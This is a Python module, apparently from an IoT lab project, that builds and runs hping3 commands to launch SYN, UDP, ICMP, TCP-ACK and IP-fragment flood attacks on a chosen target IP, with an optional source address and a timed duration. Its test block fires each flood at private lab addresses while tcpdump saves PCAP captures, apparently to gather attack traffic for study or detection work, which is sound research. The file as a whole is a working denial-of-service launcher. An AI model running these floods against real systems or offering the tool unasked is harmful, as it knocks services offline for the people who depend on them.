"""
Attack Engine Module

This module provides functionality for:
- SYN flood attacks
- UDP flood attacks  
- ICMP flood attacks
- Attack execution and monitoring
"""

import asyncio
import logging
import subprocess
import sys
from typing import Optional, Dict, Any

# Configure logger
logger = logging.getLogger(__name__)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    filename='logs/app.log',
    filemode='a'
)
console = logging.StreamHandler(sys.stdout)
console.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(name)s: %(message)s')
console.setFormatter(formatter)
logging.getLogger('').addHandler(console)

class AttackEngine:
    """Attack engine for executing various network attacks"""
    
    def __init__(self):
        self.attack_process: Optional[asyncio.subprocess.Process] = None
        self.current_attack: Optional[str] = None
        self.attack_config: Optional[Dict[str, Any]] = None
    
    async def start_attack(self, attack_type: str, target_ip: str, interface: str = "eth0", 
                          duration: int = 60, port: int = 55443) -> bool:
        """
        Start an attack with specified parameters.
        
        Args:
            attack_type: Type of attack (syn_flood, udp_flood, icmp_flood, etc.)
            target_ip: Target IP address
            interface: Network interface to use
            duration: Attack duration in seconds
            port: Target port for the attack (default: 55443)
            
        Returns:
            bool: True if attack started successfully, False otherwise
        """
        logger.info(f"Starting {attack_type} attack on {target_ip}:{port} for {duration} seconds")
        
        try:
            command = self._build_attack_command(attack_type, target_ip, interface, port)
            
            if not command:
                logger.error(f"Unknown attack type: {attack_type}")
                return False
            
            # Add timeout to the command for continuous attacks that support --flood
            continuous_attacks = ['syn_flood', 'udp_flood', 'icmp_flood', 'tcp_flood', 'ip_frag_flood']
            if attack_type in continuous_attacks:
                command = ['timeout', str(duration)] + command
            
            logger.info(f"执行命令: {' '.join(command)}")
            
            # Create subprocess to execute the attack command
            self.attack_process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,  # 捕获输出用于调试
                stderr=asyncio.subprocess.PIPE   # 捕获错误信息
            )
            
            if self.attack_process and self.attack_process.pid:
                self.current_attack = attack_type
                self.attack_config = {
                    'type': attack_type,
                    'target': target_ip,
                    'interface': interface,
                    'duration': duration,
                    'port': port
                }
                logger.info(f"Attack started successfully (PID: {self.attack_process.pid})")
                
                # Wait for the process to finish and capture output
                stdout, stderr = await self.attack_process.communicate()
                
                # 分析执行结果
                return_code = self.attack_process.returncode
                logger.info(f"Attack process finished with return code: {return_code}")
                
                # 记录输出信息用于调试
                if stdout:
                    stdout_text = stdout.decode('utf-8', errors='ignore')
                    if stdout_text.strip():
                        logger.info(f"攻击输出: {stdout_text[:500]}...")  # 截断长输出
                
                if stderr:
                    stderr_text = stderr.decode('utf-8', errors='ignore')
                    if stderr_text.strip():
                        if return_code == 0:
                            logger.info(f"攻击信息: {stderr_text[:500]}...")
                        else:
                            logger.error(f"攻击错误: {stderr_text[:500]}...")
                
                # 根据返回码判断是否成功
                # hping3在正常超时退出时返回码通常是0或124(timeout)
                success = return_code in [0, 124]  # 0=正常, 124=timeout命令正常超时
                
                if success:
                    logger.info(f"{attack_type} attack completed successfully")
                else:
                    logger.error(f"{attack_type} attack failed with return code {return_code}")
                
                # Clean up after completion
                self.attack_process = None
                self.current_attack = None
                self.attack_config = None
                return success
            else:
                logger.error("Failed to start attack process")
                return False
                
        except Exception as e:
            logger.error(f"Failed to start attack: {e}", exc_info=True)
            # Ensure cleanup on error
            if hasattr(self, 'attack_process') and self.attack_process:
                try:
                    self.attack_process.kill()
                except:
                    pass
                self.attack_process = None
            self.current_attack = None
            self.attack_config = None
            return False
    
    def _build_attack_command(self, attack_type: str, target_ip: str, interface: str, port: int) -> Optional[list]:
        """Build the command list for the specified attack type"""
        
        # 获取接口的IP地址作为源地址
        source_ip = self._get_interface_ip(interface)
        if not source_ip:
            logger.warning(f"无法获取接口 {interface} 的IP地址，将使用默认源地址")
        
        attack_commands = {
            'syn_flood': [
                'hping3', '-S', '-I', interface, 
                '-a', source_ip or '0.0.0.0',  # 添加源地址参数
                '-p', str(port), '-i', 'u1000', '--flood', target_ip
            ],
            'udp_flood': [
                'hping3', '--udp', '-I', interface,
                '-a', source_ip or '0.0.0.0',  # 添加源地址参数
                '-p', str(port), '-i', 'u1000', '--flood', target_ip
            ],
            'icmp_flood': [
                'hping3', '--icmp', '-a', source_ip or '0.0.0.0', '--flood', target_ip
            ],
            'tcp_flood': [
                'hping3', '-A', '-I', interface,
                '-a', source_ip or '0.0.0.0',  # 添加源地址参数
                '-p', str(port), '-i', 'u1000', '--flood', target_ip
            ],
            'ip_frag_flood': [
                'hping3', '-f', '-I', interface,
                '-a', source_ip or '0.0.0.0',  # 添加源地址参数
                '-p', str(port), '--flood', target_ip
            ]
        }
        
        return attack_commands.get(attack_type)
    
    def _get_interface_ip(self, interface: str) -> Optional[str]:
        """获取指定网络接口的IP地址"""
        try:
            if interface == 'any':
                # 如果是any接口，尝试获取默认路由的接口IP
                result = subprocess.run(['ip', 'route', 'get', '8.8.8.8'], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'src' in line:
                            parts = line.split()
                            src_index = parts.index('src') + 1
                            if src_index < len(parts):
                                return parts[src_index]
            else:
                # 获取指定接口的IP地址
                result = subprocess.run(['ip', 'addr', 'show', interface], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'inet ' in line and 'scope global' in line:
                            # 提取IP地址 (格式: inet 10.12.0.253/24)
                            parts = line.strip().split()
                            if len(parts) >= 2:
                                ip_with_mask = parts[1]
                                ip = ip_with_mask.split('/')[0]
                                logger.info(f"接口 {interface} 的IP地址: {ip}")
                                return ip
        except Exception as e:
            logger.error(f"获取接口 {interface} IP地址失败: {e}")
        
        return None
    
    async def stop_attack(self) -> bool:
        """
        Stop the currently running attack.
        
        Returns:
            bool: True if attack stopped successfully, False otherwise
        """
        if not self.attack_process:
            logger.warning("No attack process to stop")
            return False
        
        try:
            # Terminate the attack process
            self.attack_process.terminate()
            
            # Wait for process to terminate with timeout
            try:
                await asyncio.wait_for(self.attack_process.wait(), timeout=5.0)
            except asyncio.TimeoutError:
                logger.warning("Process didn't terminate gracefully, forcing kill")
                self.attack_process.kill()
                await self.attack_process.wait()
            
            logger.info("Attack stopped successfully")
            self.attack_process = None
            self.current_attack = None
            self.attack_config = None
            return True
            
        except Exception as e:
            logger.error(f"Failed to stop attack: {e}")
            # Force cleanup
            if self.attack_process:
                try:
                    self.attack_process.kill()
                except:
                    pass
                self.attack_process = None
            self.current_attack = None
            self.attack_config = None
            return False
    
    def get_attack_status(self) -> Dict[str, Any]:
        """
        Get the current attack status.
        
        Returns:
            Dict containing attack status information
        """
        status = {
            'is_running': False,
            'attack_type': self.current_attack,
            'config': self.attack_config,
            'pid': None,
            'returncode': None
        }
        
        if self.attack_process:
            try:
                status['is_running'] = self.attack_process.returncode is None
                status['pid'] = self.attack_process.pid
                status['returncode'] = self.attack_process.returncode
            except Exception as e:
                logger.warning(f"Failed to get process status: {e}")
                # Keep default values
        
        return status
    
    def is_attack_running(self) -> bool:
        """Check if an attack is currently running"""
        if self.attack_process is None:
            return False
        
        # Check if process is still running (returncode is None for running processes)
        try:
            return self.attack_process.returncode is None
        except Exception:
            # If we can't check the process status, assume it's not running
            return False


if __name__ == '__main__':
    # Example usage with traffic capture - test all attack types
    async def test_all_attacks():
        from traffic_capture import TcpdumpUtil
        import time
        
        engine = AttackEngine()
        
        # 定义所有要测试的攻击类型
        attack_types = [
            'syn_flood',
            'udp_flood', 
            'icmp_flood',
            'tcp_flood',
            'ip_frag_flood'
        ]
        
        # 测试目标 (可以根据实际环境修改)
        target_ip = '10.12.0.189'
        test_duration = 5  # 每种攻击测试5秒
        interface = 'eth0'
        port = 80
        
        print(f"开始测试所有攻击类型，目标: {target_ip}")
        print(f"测试持续时间: {test_duration}秒/种攻击")
        print("=" * 60)
        
        for i, attack_type in enumerate(attack_types, 1):
            print(f"\n[{i}/{len(attack_types)}] 测试 {attack_type.upper()} 攻击...")
            
            # 为每种攻击类型创建独立的 PCAP 文件
            pcap_file = f'../data/{attack_type}_capture.pcap'
            tcpdump = TcpdumpUtil(
                output_file=pcap_file, 
                interface='any',  # 捕获所有接口
                extra_args=['-s', '0']  # 捕获完整数据包
            )
            
            try:
                # 开始流量捕获
                print(f"  → 开始捕获流量到 {pcap_file}")
                tcpdump.start()
                
                # 等待一下确保 tcpdump 完全启动
                await asyncio.sleep(1)
                
                # 开始攻击
                print(f"  → 开始 {attack_type} 攻击 (持续 {test_duration} 秒)")
                start_time = time.time()
                
                success = await engine.start_attack(
                    attack_type=attack_type,
                    target_ip=target_ip, 
                    interface=interface,
                    duration=test_duration,
                    port=port
                )
                
                end_time = time.time()
                actual_duration = end_time - start_time
                
                if success:
                    print(f"  ✓ {attack_type} 攻击完成 (实际耗时: {actual_duration:.1f}秒)")
                else:
                    print(f"  ✗ {attack_type} 攻击失败")
                
                # 检查攻击状态
                status = engine.get_attack_status()
                print(f"  → 攻击状态: {status}")
                
                # 等待攻击完全结束
                while engine.is_attack_running():
                    await asyncio.sleep(0.5)
                    print(".", end="", flush=True)
                
                # 停止流量捕获
                print(f"\n  → 停止流量捕获")
                tcpdump.stop()
                
                print(f"  ✓ {attack_type} 测试完成，PCAP 文件已保存")
                
                # 在攻击之间稍作休息
                if i < len(attack_types):
                    print("  → 等待 2 秒后开始下一个测试...")
                    await asyncio.sleep(2)
                    
            except Exception as e:
                print(f"  ✗ {attack_type} 测试失败: {e}")
                # 确保清理
                if engine.is_attack_running():
                    try:
                        await asyncio.wait_for(engine.stop_attack(), timeout=5.0)
                    except:
                        if engine.attack_process:
                            try:
                                engine.attack_process.kill()
                            except:
                                pass
                try:
                    tcpdump.stop()
                except:
                    pass
                
                # 继续下一个测试
                continue
        
        print("\n" + "=" * 60)
        print("所有攻击测试完成!")
        print("\n生成的 PCAP 文件:")
        for attack_type in attack_types:
            print(f"  - ../data/{attack_type}_capture.pcap")
        
        print("\n每个 PCAP 文件包含:")
        print("  - 攻击数据包 (本机 -> 目标)")
        print("  - 响应数据包 (目标 -> 本机)")
        print("  - 相关网络流量")
        print("  - 所有网络接口的流量")
        
        print(f"\n使用 Wireshark 或 tcpdump 分析 PCAP 文件:")
        print("  tcpdump -r ../data/syn_flood_capture.pcap")
        print("  wireshark ../data/syn_flood_capture.pcap")
    
    # 单独测试单种攻击的函数
    async def test_single_attack():
        from traffic_capture import TcpdumpUtil
        
        engine = AttackEngine()
        
        # 测试单种攻击
        tcpdump = TcpdumpUtil(
            output_file='../data/single_attack_capture.pcap', 
            interface='any',
            extra_args=['-s', '0']
        )
        
        try:
            print("开始单次攻击测试...")
            tcpdump.start()
            
            success = await engine.start_attack('syn_flood', '10.12.0.182', 'eth0', 5, 80)
            print(f"攻击结果: {'成功' if success else '失败'}")
            
            status = engine.get_attack_status()
            print(f"攻击状态: {status}")
            
            while engine.is_attack_running():
                await asyncio.sleep(1)
                print(".", end="", flush=True)
            print("\n攻击自动完成!")
            
            tcpdump.stop()
            print("测试完成! 检查 ../data/single_attack_capture.pcap")
            
        except Exception as e:
            print(f"测试失败: {e}")
            if engine.is_attack_running():
                try:
                    await asyncio.wait_for(engine.stop_attack(), timeout=5.0)
                except:
                    if engine.attack_process:
                        try:
                            engine.attack_process.kill()
                        except:
                            pass
            try:
                tcpdump.stop()
            except:
                pass
    
    # 运行测试
    print("IoT 实验室攻击引擎测试")
    print("1. 测试所有攻击类型")
    print("2. 测试单种攻击")
    
    # 默认运行所有攻击测试
    try:
        asyncio.run(test_all_attacks())
    except KeyboardInterrupt:
        print("\n测试被用户中断")
    except Exception as e:
        print(f"\n测试过程中出现错误: {e}")
        print("尝试运行单次测试...")
        try:
            asyncio.run(test_single_attack())
        except Exception as e2:
            print(f"单次测试也失败: {e2}")
 